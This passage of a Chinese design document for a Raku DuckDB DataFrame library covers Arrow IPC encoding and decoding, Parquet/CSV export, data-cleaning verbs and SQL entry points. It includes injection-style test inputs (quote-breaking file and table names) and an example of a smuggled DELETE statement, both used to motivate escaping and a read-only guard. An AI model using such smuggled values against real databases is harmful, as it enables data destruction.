要求两个地址同时给。`DB::DuckDB` 在 1.0.x 只有 array 那一半，所以 Duckula 这一层
之前根本没法导出成"能被别人读懂的东西"。

#### 由 Duckula 持有 result

Arrow 的 schema 引用着构建它时的那份 result（format 字符串与 children 数组都指向
result 的 arrow options / logical types）。所以 `Duckula::Arrow` 自己 query 一份
result 并**持有**它，`free` 时一起放掉。

不这么做的后果很具体：如果直接返回 `DB::DuckDB::Arrow::Schema` 而让临时 result
被 GC，调用方拿到的是一个指向已释放内存的 schema —— 读 `.format` 可能还对，
读 `.children` 就崩。

代价是多执行一次 `SELECT`。比起"借用 Frame 内部那个 result、然后担心它什么时候
被物化路径消耗掉"，多一次扫描更可预测。

#### format 字符串与读取方法要对上

`Column` 的读取方法按 Arrow 物理布局分，**不能乱用**：

| Arrow format | 类型 | 正确的读法 |
|---|---|---|
| `l` | int64 | `.ints` |
| `i` | int32 | `.int32s` |
| `g` | double | `.nums` |
| `u` | utf8 | `.strs` |
| `b` | boolean | `.bools` |
| `tdD` | date32 | `.int32s` |
| `ts*` | timestamp | `.ints`（物理上是 int64） |
| `d:*` | decimal128 | 无现成方法（16 字节定点，要自己拼） |
| `+l` / `+s` / `+m` | list / struct / map | `.children` 递归 |

拿 `.ints` 读 int32 列会**静默给出错位的数据**（两个 int32 被当成一个 int64），
这是 §7.1 那类最难查的错。所以先用 `.format-of($col)` 看类型，再决定读法。

DuckDB 对不带类型标注的字面量（`values (1,...)`）推断成 INT32，想稳定拿到 `l`
就写 `1::BIGINT`。

#### 阶段 6 的剩余部分

已经打通的是"导出去"（schema + array），跨进程的文件级交换见 §8.13，
反方向（读别人的 IPC 文件）见 §8.15。

C 指针那条路（`ArrowArrayStream`）仍然没做，结论维持不变：它**不是做不了**
（`ArrowArrayStream` 就是五个函数指针的公开结构，自己组装即可），而是用途太窄
—— 裸指针只在本进程有效。v0.14.0 给了它一个不需要裸指针的替代：
`ipc-buf` 把同一份编码结果留在内存里当 `Buf`，`pa.ipc.open_stream(bytes)` 直接读。
真正解决"跟 Python 交换"的还是字节，不是指针。

`COPY … (FORMAT ARROW)` 依然是堵的：`arrow` 扩展只发布在标准平台，本机的
`windows_amd64_mingw` 构建在核心仓和社区仓都是 404。这也是 §8.13 自己写
编码器、§8.15 自己写解码器的直接原因。

### 8.13 Arrow IPC 导出（v0.11.0）

```raku
$df.write-ipc('out.arrow');                    # file 格式：magic + messages + footer
$df.write-ipc('out.arrows', :format<stream>);  # stream 格式：messages + EOS
```

产物是自描述字节能，pyarrow / polars / 任何 Arrow 实现都能直接打开：

```python
import pyarrow.ipc as ipc
t = ipc.open_file('out.arrow').read_all()
```

#### 为什么要自己写编码器

`COPY … TO … (FORMAT ARROW)` 需要 DuckDB 的 `arrow` 扩展，而该扩展只发布在标准
平台 —— 本机 `windows_amd64_mingw` 构建去核心仓和社区仓拿都是 404。但 Arrow IPC
的格式本身是完全公开的：一串「continuation + metadata(FlatBuffers) + body」，外加
file 格式的 footer 索引。

而写入所需的原材料，DuckDB 已经全给了：`duckdb_to_arrow_schema` 给格式字符串与
children，`duckdb_data_chunk_to_arrow` 给 buffer 裸指针与长度。缺的只有
**FlatBuffers 序列化**这一层。于是 `lib/Duckula/ArrowIPC.rakumod` 里手写了一个
最小构造器（table / struct / vector / string / union），再按 Arrow 的
`Message.fbs` / `Schema.fbs` / `File.fbs` 摆布局。

#### 三层结构

| 层 | 内容 |
|---|---|
| `FlatBuf` | 从后往前写的最小 FlatBuffers 构造器：`start-table` / `slot` / `end-table`、`start-vector` / `end-vector`、`prepend-string`、`finish` |
| 表布局 | `parse-format` 把 Arrow format 字符串翻成 Type union 标签；`build-field` / `build-schema` / `build-record-batch` / `footer-message` |
| 封装 | `BodyAcc` 收集 FieldNode 与 buffer 描述并拼 body；`write-ipc` 负责 message 封装、footer、EOS |

#### 六个布局坑（都是「报错指向别处」型）

1. **soffset 的方向**：vtable 在 table 的**低地址**侧，所以存的是
   `vtable_off - table_off`。写反了表头照样能被当成数字读出来，但字段全错位，
   症状是 pyarrow 说「Old metadata version not supported」。
2. **vtable 字段表被 itemize**：`my @slots = %t<slots>` 会把 Array 再套一层，
   取出来是 `[[...]]`，于是 vtable 里只剩一个字段。`TblState` 用标量属性持有
   Array 就是为了躲这个。
3. **`Date.unit` 的默认值是 MILLISECOND**，不是 DAY。省略不写等于声明 date64，
   4 字节的 date32 会被按 8 字节读，日期飞到几千年后。
4. **`Block` 的填充位置**：`{int64 offset; int32 metaDataLength; int64 bodyLength}`
   里 4 字节填充在 metaDataLength **之后**。从后往前写时若只靠 `align(8)` 自动补，
   填充会落在 offset 和 metaDataLength 之间。
5. **body 尾部要补到 8 字节**：否则下一条 message 的起点不正，报「Unaligned block」。
6. **位图尾部高位要清零**：有效位与 bool 数据都是位图，最后那个字节里超出
   `n` 的高位在 Arrow 里未定义，DuckDB 会留着上一位的残值。

#### 字典（ENUM）

DuckDB 的 ENUM 在 C data interface 里是「索引数组 + `dictionary` 指针」：
列的 format 是 `C`（uint8），值类型在 `dictionary` 指向的 schema 里（`u`）。
这里有两处必须一起对上：

- `Field.type` 要写**值类型**（utf8），索引类型放在
  `DictionaryEncoding.indexType`；照列自己的 `C` 写，pyarrow 会认为字典值是 uint8。
- 字典值本身要作为 `DictionaryBatch`（`MessageHeader` = 2）发出去，且必须排在
  第一条引用它的 `RecordBatch` 之前。

顺带一条硬的：`Map` 的 `entries` 必须不可空，`entries.key` 也必须不可空，
少一条 pyarrow 直接拒收（「Map's keys must be non-nullable」）。

#### 覆盖范围与已知边界

已覆盖：全部整型/浮点、varchar、blob、bool、date、time、timestamp、interval、
decimal（含 HUGEINT → decimal128(38,0)）、list、struct、map、ENUM。

边界：

- 写读已闭合：v0.14.0 起 `read-arrow` 能把这类文件读回来（§8.15），v0.15.0 起
  `struct` / `map` 也在读侧落地。
- 字典按「每个 chunk 重新发一份」处理，不做 delta（读侧支持 delta）。
- **null 槽已规范化**（v0.15.0）：Arrow 规定空值那一格的内容未定义，DuckDB 目前
  多数时候会顺手清掉，但规范不保证、不同版本不一致。写出侧现在显式做一遍归一 ——
  定长槽清零、位图的空值位清零、变长槽先清掉自己占的那段数据再把 offset 改成
  「长度 0」、复合类型把父级的空传给子级。于是**同一份逻辑数据必然写出逐字节
  相同的文件**，与算子顺序、物理布局、DuckDB 版本都无关。代价是写出时多一次
  线性扫（只扫空值槽，非空行完全不碰）。

#### 怎么验

`t/14-arrow-ipc.rakutest` 分两层：先断言文件结构（magic、footer 自洽、EOS、
continuation），再**让 pyarrow 当裁判**把数据读回来比对。第二层是本机装了
`python` + `pyarrow` 才跑，没有就 `skip` —— 结构断言能证明"我们写的和读的一致"，
只有外部实现能证明"字节真的符合规范"。

---

### 8.14 写出：Parquet / CSV / 表（v0.12.0）

```raku
$df.to-parquet('out.parquet');                       # 返回行数，默认 zstd
$df.to-csv('out.csv', :delimiter<;>, :null<NA>);
$df.to-table('clean_orders');                        # CREATE TABLE AS
$df.append-to('clean_orders');                       # INSERT INTO ... SELECT

$s.execute('CREATE TABLE t (i BIGINT, s VARCHAR)');  # 写语句，返回受影响行数
$s.insert('t', ((1, 'a'), (2, Any)));                # Raku 行 -> Appender
$s.create-table('x', $df);                           # 也接 LazyFrame / SQL 字符串
```

#### 三条路径，一个判断标准：数据要不要经过 Raku

| 入口 | 落到哪里 | 机制 | 数据过不过 Raku |
|---|---|---|---|
| `to-parquet` | 文件 | `COPY (<sql>) TO '…' (FORMAT PARQUET, COMPRESSION …)` | 不过 |
| `to-csv` | 文件 | `COPY (<sql>) TO '…' (FORMAT CSV, HEADER …, DELIMITER …)` | 不过 |
| `to-table` | 库里 | `CREATE [OR REPLACE] [TEMP] TABLE "x" AS <sql>` | 不过 |
| `append-to` | 库里 | `INSERT INTO "x" <sql>` | 不过 |
| `Session.insert` | 库里 | `Appender` 逐行 | **过**（数据本来就在 Raku 里） |

前四条都是把「一条 SELECT」换个去处，DuckDB 自己搬，一行都不进 Raku —— 这也是
为什么它们比 `Frame.rows` 再 `insert` 快几个数量级。`Session.insert` 是唯一的
反方向：数据在 Raku 里，只能逐行走 Appender（批量、单事务，失败整批回滚）。

#### `COPY` 不接受绑定参数 —— 所以必须转义

这是本节唯一真正需要注意的事。`COPY (SELECT … WHERE x = ?) TO …` 里那个 `?`
不会被 prepared statement 填上，执行时报语法错误。写文件只能拼文本，于是：

- 路径 / 分隔符 / NULL 标记 → `sql-literal`（单引号双写）
- 表名 → `quote-ident`（双引号双写）
- 压缩算法 → 白名单（`uncompressed brotli gzip snappy lz4 lz4_raw zstd`）

`t/15-write.rakutest` 里直接拿 `o'rders.parquet` 和 `weird"name` 当输入，并断言
「没有多出第二个文件」—— 证明引号没有把字面量提前闭合。

惰性路径因此要先渲染参数：`LazyFrame!write-sql` 把 `compile-plan` 出来的 `?` 用
`render-bindings` 变成字面量。这一步只在出库那一刻发生，计划树本身与 `collect`
走的查询路径仍然是绑定参数。好处是不必 `collect`（省一次取数）——
`$lf.to-parquet(...)` 直接就是一条 `COPY (SELECT …)`。

#### 行数从哪来

`COPY` 不回报行数。统一在写之前 `SELECT count(*) FROM (<sql>)`：DuckDB 对这条
有统计信息可用，通常不扫数据。`append-to` 例外，`INSERT` 的 rows-affected 直接
就是答案。

#### 沙箱

`Session.new(:sandbox)` 会 `SET enable_external_access=false`。写文件此时必然失败，
所以在入口就 `die` 并说清原因（"create it with `Duckula::Session.new(:!sandbox)`"），
而不是让 DuckDB 抛一句 `Cannot access file`。写表不受影响 —— 表不出库。

---

### 8.15 Arrow IPC 读入（v0.14.0 起，v0.15.0 补齐嵌套）

```raku
my $df = $s.read-arrow('out.arrow');                     # file 格式
my $df = $s.read-arrow('out.arrows');                    # stream 格式，自动识别
my $df = $s.read-arrow('out.arrow', :name<imported>);
say $s.describe-arrow('out.arrow').gist;                 # 不读数据，只看骨架
```

#### 为什么只能自己解

DuckDB 没有 `read_arrow()`。能读 Arrow 的只有两条路，都不通：

| 路 | 为什么不行 |
|---|---|
| `arrow` 扩展（`scan_arrow_ipc`） | 只发布在标准平台，`windows_amd64_mingw` 拿不到（同 §8.13） |
| `duckdb_arrow_array_scan` | 已标 DEPRECATED，且要求调用方亲手构造并维护 `ArrowSchema` / `ArrowArray` 的 C 结构树 |

所以走第三条：**解码成 Raku 值 → `CREATE TEMP TABLE` → Appender 灌入**。代价是
数据过一次解释器（几十万行/秒量级），换来的是没有裸指针、没有废弃 API，且每个
不支持的类型都能报出**列名 + Arrow 类型**，而不是一句 `scan failed`。

#### FlatBuffers 读的三个点

写侧是从后往前拼，读侧是顺着偏移跳，难点正好互补：

1. **table 的首字段是有符号 soffset**：`vtable = table_pos - int32(table_pos)`。
   vtable 在低地址侧时 soffset 为正，负值表示 vtable 在 table 之后。取反会读到
   邻居 table 的字段表 —— 数字照样读得出来，只是全是别人的。
2. **缺省字段不占字节**：FlatBuffers 不写默认值，所以「字段偏移为 0」必须回落到
   该字段的**类型默认值**，而不是 0。踩过的两个具体例子：
   - `FloatingPoint.precision` 默认是 HALF(0)，float16 的字段根本不出现，
     用 0 当"缺失"会把它误判成别的精度；
   - `Date.unit` 默认是 MILLISECOND，所以 date32 必须显式读 unit。
3. **struct vector 与 table vector 不同**：`FieldNode` / `Buffer` / `Block` 是内联
   的固定宽度结构（16 / 16 / 24 字节），元素本身没有 uoffset；而 `Field` /
   `KeyValue` 的元素是 uoffset。混用会整天偏移。

#### 词汇表复用：Type union → format 字符串

`ArrowRead` 不重复定义一套类型系统。`type-format($tag, $type)` 把 FlatBuffers 的
`Type` union 翻译成 Arrow 的 format 字符串（`l` / `u` / `d:18,4,128` / `tsu:` …），
再交给写侧的 `Duckula::ArrowIPC::parse-format` 归一成 `%(kind => 'fixed')` 这类
词汇。于是：

- 解码分支与 `walk-node` 的编码分支一一对称（`fixed` / `utf8` / `list` 三种 buffer
  布局就是全部）；
- 写出侧修一个 format 解析 bug，读侧自动跟着修 —— v0.14.0 里 `'e'`（half）的
  precision 是 0 当假值处理导致漏判，就是这一次两边一起暴露出来的。

#### 列存 → Raku 值

```
定点宽度（int/float/date/time/timestamp/decimal/interval/fixedsizebinary）
    buffers: [validity, values]
bool
    buffers: [validity, bitmaps]
utf8 / binary / large*
    buffers: [validity, offsets, data]
list / large_list
    buffers: [validity, offsets] + 子节点递归
struct
    buffers: [validity] + 各子节点递归（无 offsets）
map
    buffers: [validity, int32 offsets] + entries 子节点（一个 Struct）
fixedsize_list / union
    明确 die
```

`struct` 与 `map` 是 v0.15.0 补上的，两者都不改变上面那套流式消费的规矩：

- **struct** 自己没有 offsets，一个 FieldNode + 一个 validity，然后各子列按声明
  顺序各来一遍；子列长度与父列相同，所以逐行拼值即可。
- **map** 在 Arrow 里就是 `List<Struct<key, value>>` —— 只有 offsets 要自己读，
  entries 整个交给 `decode-field` 当 Struct 解。这是规范省下来的力气：`KeyValue`
  不是新类型，是 struct 的一个特例。
- 元素大小写回时靠 `StructVal` / `MapVal`：**不能**用 Raku 的 `Hash`，因为它
  不保证遍历顺序，而 STRUCT 字面量必须按 schema 的顺序写字段名；Map 的键也不
  一定是字符串。两个类都只装一个 Array，属性用标量 `$.vals` /
  `$.pairs` —— `@`-sigil 属性装 Array 会被 itemize 一层，取出来就成了「一个
  元素的数组」。

`validity` 为空（长度 0）表示「这一列没有 NULL」，不能按"剩余字节"推断 ——
这正是 `Bytes` 要同时带 `base` 与 `len` 的原因：长度为 0 的合法 buffer 和
"窗口到末尾"是两件事。

节点与 buffer 是两条独立的流，都按**深度优先前序**排列。少消费一个 buffer，
后面整条流就错位，症状是"某列的值全变成隔壁列的"。所以这里只能严格按 schema 走。

#### 值怎么进 DuckDB

`Appender` 对 `Bool` / `Int` / `Rat` / `Num` / `Str` / `Blob` 有原生绑定，其它
走 `.Str`。Arrow 的时间和日期在 Raku 侧先转成 `YYYY-MM-DD[ HH:MM:SS.ffffff]` 文本，
DuckDB 自己 cast。

三种容器都渲染成 DuckDB **能 cast 回来**的文本：

| 类型 | 写法 |
|---|---|
| `LIST` | `[1, 2, NULL]` |
| `STRUCT` | `{'name': <value>, ...}` |
| `MAP` | `{'key'=<value>, ...}` |

这里的转义规则不是 SQL 标准的「单引号双写」，而是 DuckDB 自己打印 VARCHAR 时
用的那一套：**反斜杠双写、单引号写成 `\'`**。两种写法混用不会报错，只会静默
给出错误的字符串（`'q''r'` 被读成 `qr`），所以必须与打印格式对齐。

`MAP` 尤其要注意：`MAP {…}` 前缀和 `k:v` 冒号只在小写 SQL 字面量里成立，
`VARCHAR -> MAP` 的 cast 只认 `{k=v}`。

`BLOB` 在容器里也走 `\xNN` 转义 —— 而它得先经过容器字面量自身那一层反转义
（`\x00` 在那一层会被吃成 `x00`，字节就变成字面量 `x00`），所以反斜杠同样要
双写，`quoted-str` 一视同仁。

两处有意的降级：

| Arrow | DuckDB | 原因 |
|---|---|---|
| `Interval` | `VARCHAR` | Appender 的 cast 不支持 `VARCHAR -> INTERVAL`（DuckDB 只实现了 SQL 侧的 cast）。压成整数会丢语义：月不是固定天数 |
| `Duration` | `BIGINT` | 保留原始计数，单位随 format 字符串给出 |

`Decimal` 不走 `Num`：`1.10` 经 double 会变成 `1.1000000000000000888…`。这里用
Raku 的任意精度 `Int` 拼出十进制文本（4 个 u32 → 128 位有符号整数），
`DECIMAL(18,4)` 往返后仍是 `DECIMAL(18,4)`。

#### 临时表与命名

`read-arrow` 是**急切**的：字节必须现在解码，表必须现在建。表名默认
`__duckula_arrow_N`，进程内单调递增，所以两次导入不会互相覆盖；`:$name` 可指定。
连接一关表就没了 —— 这是与 `read-parquet`（惰性、SQL 谓词、无中间表）最本质的
区别，也意味着 Frame 不能跨连接使用。

顺便一个坑：`state Int $seq = 0;` 写在 `do { }` 块里时编号会从 1 重来（每次进入
都可能是新闭包），第二次导入就覆盖了第一次的表。计数器因此放在模块作用域。

#### 怎么验

`t/17-arrow-read.rakutest`（40 项）：

- **自往返**：18 列覆盖全部标量类型 + `LIST` + `BLOB`，读回后逐列比对
  `describe` 类型字符串，再用 `EXCEPT ALL` 双向比对每一行；
- **嵌套自往返**：`STRUCT` / `MAP` / `LIST<STRUCT>` / 结构套结构，比对类型、
  双向 `EXCEPT ALL`、以及 `s.x` / `m['k']` / `ls[2].u` / `ns.a.p` 的叶子值；
- **别人的文件**：pyarrow 写一个 3 批次、含字典列 / list 列 / decimal 列的 250 行
  文件，我们读回来做聚合断言；再写一个 struct / list<struct> / map 且三层 NULL
  位置不同的文件，逐行比对；
- **坏输入**：缺文件、非 Arrow 字节、截断文件都必须 die 而不是解出垃圾行；
- **不支持类型**：`FixedSizeList` 的报错必须带列名。这个断言逼出一个改动 ——
  类型不支持的判定发生在 schema 解析阶段，那时只有 tag 数字，所以
  `parse-field` 要把它接住再抛一次，把列名补进去。

---

### 8.16 清洗与重塑（v0.16.0）

> 现状：阶段 11 的第一批。`concat` / `unique` / `value-counts` / `rename` /
> `drop` / `drop-nulls` / `fill-nulls` / `cast`，外加表达式级的 `col('x').cast(...)`。
> eager 与 lazy 两侧语义一致，回归 `t/18-clean.rakutest`（81 项）。

#### 为什么先做这批

阶段 0–10 把 Arrow 的读写和嵌套类型都闭合了，但那张 API 表仍然缺「日常动词」。
最要命的是**没有行拼接**：读十个 CSV 再合并，只能手写
`duckula.sql("select * from a union all by name select * from b")` —— 而这恰好是
`pd.concat` / `pl.concat` 的日常用法。Arrow 再完整也不能把这件事变简单。

判断标准就一条：**这批动作用户每天都在写，而每个都只要一行 SQL**。相比之下
`FixedSizeList` / `Union` 的读入属于「真实数据里几乎不出现」，收益完全不对等。

#### 一处语义，两个壳

所有 SQL 片段都放在 `Duckula::Clean`（纯函数，不依赖 Frame 类型），eager 与 lazy
各自把它塞进自己的壳里。这么分的理由和 `Duckula::Join` 一样：语义写两遍就一定会
漂 —— 第一版 `drop-nulls(:how<all>)` 就是这么差点在两条路径上"一致地错"。

lazy 侧并不是全部进计划树的，分界是**计划树能不能表达**：

| 算子 | eager | lazy | 分界原因 |
|---|---|---|---|
| `rename` / `drop` / `cast` | `SELECT <items>` | `Plan::Project` | 就是一个投影 |
| `drop-nulls` | `WHERE <pred>` | `Plan::Filter` | 就是一个过滤，能和相邻 filter 合并成一个 `WHERE` |
| `fill-nulls`（值 / mean / median） | 投影 | `Plan::Project` | 同上 |
| `fill-nulls`（ffill / bfill） | 三层嵌套 | `Plan::Project`（anchored） | 需要行序锚，渲染器已有这套 |
| `concat` | `UNION ALL BY NAME` | `Plan::Source` | `Plan::Query` 只描述单个 SELECT，表达不了集合运算 |
| `unique` / `value-counts` | 三层嵌套 / 分组 | `Plan::Source` | 同上（`DISTINCT ON`、窗口计数都没有对应的子句） |

"退化成 `Source`"不是放弃优化：`Source` 的参数照原顺序带上去，`collect` 时仍然
走绑定参数，只是计划树从这一点往下不再合并。

#### 行序：唯一真正需要动脑的地方

SQL 结果集没有行序，但四个语义都建立在"顺序"上：

- `unique(:keep<first>)`：留每组的第一行 —— 哪一行是第一行？
- `unique(:keep<last>)`：同理；
- `unique(:keep<none>)`：只留不重复的行，但仍然要保持原顺序；
- `fill-nulls(:strategy<ffill|bfill>)`：上一个/下一个非空值是哪个？

解法统一：内层 `row_number() OVER ()` 钉一个扫描序，按它做窗口计算，最后
`ORDER BY` 排回去再 `EXCLUDE` 掉辅助列。所以 Duckula 的 `unique` **保证保序**，
比 Polars 的 `unique` 更可预期（后者不保证），也更容易写成断言。

`unique(:keep<any>)` 是唯一的例外：`DISTINCT ON` 最省，但输出顺序由执行计划决定。
要顺序就选 `first` / `last`。

#### `UNION ALL BY NAME`

按位置的 `UNION ALL` 是个陷阱：两张表列序不同就会把「城市」拼进「金额」。
`BY NAME` 按名字对齐、缺的列补 NULL、列序取第一个分支再追加后续新列，正是 pandas
`concat` 的默认行为，也等于 Polars 的 `how="diagonal"`。

`:strict` 对应 Polars 的 `how="vertical"`：拼接前逐帧比对列集合，报错时说清
「少了什么、多了什么」。默认宽松是刻意的 —— pandas 用户的第一反应就是直接拼。

跨会话拼接直接拒绝：`Frame` 握着 `$.session`，而拼出来的 SQL 会在错误的连接上
执行，结果要么报错要么含糊。

#### 一次写反的谓词

`drop-nulls(:how<all>)` 的谓词第一版写成：

```
NOT (a IS NOT NULL AND b IS NOT NULL)      # 错：这是"至少一个为空"
```

于是它只留下了含空值的行 —— 与语义正好相反。正确写法是"全空的否定"：

```
NOT (a IS NULL AND b IS NULL)              # 对：至少一个非空
```

用「被丢掉的形状」来写谓词，比用德摩根展开成 `a IS NOT NULL OR b IS NOT NULL`
更不容易读反。测试里把行号 `[1,2,3,4,5]` 钉死，就是为了这种反向量身定做。

#### `fill-nulls` 的类型粒度

`coalesce("col", <literal>)` 要求字面量能隐式转成列类型。所以：

- `fill-nulls(:value(0))` 套在整帧上时，所有列必须彼此相容 —— 遇到 VARCHAR 列
  DuckDB 会直接拒绝（`Cannot mix values of type VARCHAR and INTEGER_LITERAL`）；
  混合类型请指定列子集。
- 而 `Frame` 是惰性的，这个错误在**物化**（`gist` / `rows` / `collect`）时才出现，
  不在调用时。文档里写清了这一点，否则用户会以为调用成功了。

不替用户加 `CAST` 是故意的：自动转成列类型意味着 `'abc'` 填 INT 列会变成 NULL，
静默丢数据比报错糟得多。

#### `cast` 的类型名为什么要白名单

`CAST(x AS ?)` 是语法错误 —— 类型名没法参数绑定，只能拼文本。于是它和列名一样
属于「必须由我们自己保证合法」的一类，走形态白名单（`Duckula::Clean::check-type-name`）：

```
BIGINT  DECIMAL(18,4)  VARCHAR[]  STRUCT(a INTEGER)  DOUBLE PRECISION
```

带引号、分号、注释符的一律拒绝。表达式的类型转换走 `col('x').cast('BIGINT')`，
列级的走 `$df.cast(id => 'VARCHAR')` —— 前者能塞进 `with-column` / `select`，
后者一次改一批。

#### 两个 Raku 坑

1. **`my List $x = ...` 会 itemize**。之后 `for $x -> $i` **只迭代一次**，把整个
   List 当成一个元素交出来，而 `$x.elems` 照样返回真实长度 —— 所以很难发现。
   第一版就因此把三个列名当成一个叫 `id g v` 的列名报错。现在 `Duckula::Clean`
   的参数一律用 `@`-sigil，调用侧也一律 `my @names = ...`。

2. **`[[3, 'b']]` 会摊平成 `[3, 'b']`**。数组构造符对单个数组参数会展开，所以
   "一行"的期望值必须写成 `[[3, 'b'],]`（带尾逗号）。`t/18` 里踩了两次。

### 8.17 重塑与概览（v0.17.0）

阶段 11 第二批，五个动词：`explode` / `unpivot` / `pivot` / `sample` / `describe`。
SQL 构件集中在 `Duckula::Reshape`（纯函数），eager / lazy 各套一层壳。与 §8.16
的分界线一样：能表达成投影的（`explode`）进计划树，其余退成 `Source` 节点。

**`pivot` 为什么不用 DuckDB 原生 PIVOT**：实测把 `PIVOT ... USING ...` 交给
`duckdb_extract_statements`，DuckDB 自己把它判成 **MULTI**（包成子查询也一样）。
只读守卫不能为它开口子 —— 一旦允许 MULTI，"只读"保证就形同虚设
（`statement 1: SELECT; statement 2: DELETE`）。改用条件聚合手搓：

```
SELECT "id", sum(CASE WHEN "g" = 'a' THEN "v" END) AS "a", ...
FROM (...) AS __duckula_pv_src GROUP BY "id" ORDER BY "id"
```

代价是调用时要先跑一次 `SELECT DISTINCT g` 拿分组值（唯一一个建算子就
读数据的动词，eager/lazy 都跑），好处是列名可控、聚合函数可任意组合。
`on` 的 NULL 值默认不成组，`:keep-nulls` 才加一列 `NULL`。多值列输出名为
`<值列>_<分组值>`，按分组值外层循环生成（实测列序 `v_a, id_a, v_b, id_b`）。
`count` 用 `count(CASE WHEN ... THEN x END)`：只数 x 非空的行，缺组补 `0`
而不是 NULL —— 这是 SQL `count` 的语义，文档按此写明。

**`explode` 的空行**：DuckDB 的 `unnest(empty_list)` 与 `unnest(NULL)` 都**不
产生行**，但 pandas / Polars 的 `explode` 保留一行 NULL。默认把两者替换成
`[NULL]` 再展开以贴合 DataFrame 语义，`:!keep-empty` 切回 DuckDB 原生行为。
多列写在同一个 SELECT 列表里天然 zip（`LEFT JOIN unnest` 多列会变成笛卡尔积，
实测 x=2 项、y=2 项出 4 行，所以不能用 JOIN）。

**`sample` 的两种形态**：`:n` → `RESERVOIR (n ROWS)`，`:frac` →
`BERNOULLI (p PERCENT)`，两者恰给一个；`:seed` → `REPEATABLE (seed)`。
注意 `n ROWS REPEATABLE (42)` 会被 DuckDB parser 拒（"Bernoulli cannot be
used with a discrete sample count"），所以按行数抽样必须显式写 `RESERVOIR`。

**`describe`** 走 `SUMMARIZE`，每列一行、12 个固定列（含类型、分位数、
空值率）。它是「每列一行」而非 pandas 的「每个统计量一行」，信息量更大；
eager/lazy 的 schema 天然一致。

**`unpivot` 用原生语法**：DuckDB 把它分类为 SELECT，可以直接包成子查询。
`on` 与 `index` 不允许重叠（一列不能既展开又保留）；默认列名撞上已有列时
`private-name` 加下划线。

`:` 命名参数用标量（`:$index` / `:$values`）而非 `:@index` —— 这样 Polars
风格的 `:index<id>` 与 `:index(<id>)` / `:index(['id'])` 都能用；`flatten-args`
再统一归一。

回归 `t/19-reshape.rakutest`（52 项）；双后端各 782 项全绿。

### 8.18 read-arrow 解码缓存（v0.18.0）

`read-arrow` 的瓶颈不在 DuckDB，而在自己解 FlatBuffers + 逐 cell 解码
（几十万行/秒量级）。同一份文件反复导入时，这段纯计算没必要重做。

**缓存的是纯解码产物，不是表，也不是字节**：`%(names, types, cols)`。
判据是「什么能跨 session 共享」——

| 产物 | 能否缓存 | 原因 |
|---|---|---|
| `Buf` / `Bytes` / `Tbl` | ✗ | 字节窗口持有底层 Buf，等于把整个文件钉在内存 |
| `AField` / schema | ✗ | 只在解码期用（算类型、字典映射），产物是类型串就够 |
| 列名 / 类型串 / 列值 | ✓ | 纯 Raku 值，不引用连接、Buf 或进程外资源 |
| 临时表 / Frame | ✗ | TEMP 表属于连接，连接一关就没了 |

`decode-arrow($path)` 被抽成纯函数（只 slurp + 解析 + 解码），`read-arrow`
查缓存、未命中才调它；拿到产物后**每次都重新建表 + Appender 灌入**——
这部分依赖具体连接，无法共享，但也比解码便宜得多。跨 session 命中时只
省解码，各自建表，Frame 仍归属于读它的 session。

**指纹 = 绝对路径 + 字节数 + mtime**。不用内容哈希：那要先 slurp 整个
文件，而 slurp 正是缓存想省掉的一部分。size + mtime 足以识别「写完又读」
这类常见变化；测试实测改写文件后指纹变、重解、读到新内容。

进程级缓存上限 8 个文件，FIFO 淘汰（解码结果是全部行数据，不设上限就从
优化变成内存泄漏）。`Lock` 保护 hits/misses/entries 计数和读写。公开
`$session.arrow-cache-stats` / `$session.clear-arrow-cache` 供观测与手动释放。

回归 `t/20-arrow-cache.rakutest`（30 项）；双后端各 812 项全绿。

---

## 9. SQL 入口与混合查询

> 现状（v0.3.0）：9.1–9.4 已全部落地，见 `lib/Duckula/Session.rakumod`（`duckula.sql` /
> `Frame.sql` / 视图管理）、`lib/Duckula/Frame.rakumod`、`Duckula::SQL` 里的
> `replace-bare-ident` 与 `render-bindings`。回归测试 `t/03-placeholder.rakutest`（25 项）
> 与 `t/04-sql-entry.rakutest`（29 项）全绿。9.6 的 LazyFrame 版本仍待实现。

### 9.1 结论：不需要 SQL 解析器

DuckDB 自带完整的 ANSI SQL 解析器与优化器。Duckula 要做的所有 SQL 互操作，都能用
「字符串拼装 + 临时视图」完成，**Raku 侧不解析 SQL 语法**。

需要解析器的只有一种情况：把 SQL 文本反解成 DataFrame 计划节点（SQL → AST → 算子）。
这条路不建议走——收益为零（DuckDB 已经会优化），成本极高（要自建并维护一个 ANSI 方言
子集，还要跟着 DuckDB 的语法扩展跑）。Raku 生态现有的 `SQL::Abstract` / `SQL::Builder`
都是「数据结构 → SQL」的**生成器**，没有成熟的 SQL **文本解析器**，也印证了这件事不值得做。

### 9.2 四种入口

| 场景 | 写法 | 实现 |
|---|---|---|
| 纯 SQL | `duckula.sql("select ...")` | 直接 `conn.query`，结果包成 Frame |
| Frame 上跑 SQL | `$df.sql("... from self ...")` | Frame 落成 TEMP VIEW，`self` 替换为视图名 |
| SQL 片段作表达式 | `sql-expr("amount * 1.1")` | 片段嵌进 `SELECT ..., <frag> AS alias` |
| SQL 结果接回 API | `duckula.sql("...").group-by(...)` | 返回的 Frame 带 relation-sql，可继续拼 |

前两种已实现（v0.3.0）：

```raku
use Duckula;

my $d  = duckula;                                  # 默认会话；隔离用 Duckula::Session.new
my $f  = $d.sql('select * from t where city = ?', $city);   # 纯 SQL，值走绑定
my $g  = $f.sql('select city, count(*) as n from self group by city');
```

**参数只支持位置形式 `?`。** 命名参数（`$name`）不接：`relation-sql` 要能被固化成一
条自包含的 SQL 塞进临时视图，而位置顺序是确定的，命名参数不是。需要命名参数时，
在 Raku 侧用变量名对齐位置即可。

`Session` 的三个开关：`:conn`（复用外部连接）、`:sandbox`（切断文件/网络，见 9.5.5）、
`:strict`（默认 True；设 False 等于每条 SQL 都带 `:unsafe`）。

### 9.3 `self` 绑定：用临时视图，不用子查询

不能把 `self` 替换成 `(SELECT ...) AS __self`，两个硬伤：

- 标准 SQL 要求 FROM 子查询带别名，`self.col` 会变成 `(SELECT ...) AS __self.col`，语法错误；
- `self` 出现两次（自连接）时子查询会被重复计算。

临时视图没有这两个问题：

```sql
CREATE OR REPLACE TEMP VIEW __duckula_1 AS <frame 的 relation-sql>;
-- 用户写:  select city, sum(amount) from self group by city
-- 替换后:  select city, sum(amount) from __duckula_1 group by city
```

已在本机 DuckDB 上验证（2026-11-19），四种情形全通：

| 情形 | 结果 |
|---|---|
| `FROM __duckula_1` 普通引用 | ✓ |
| `__duckula_1.city` 限定列 | ✓ |
| 同视图自连接（引用两次） | ✓ |
| `duckdb_views()` 可见 | ✓ |

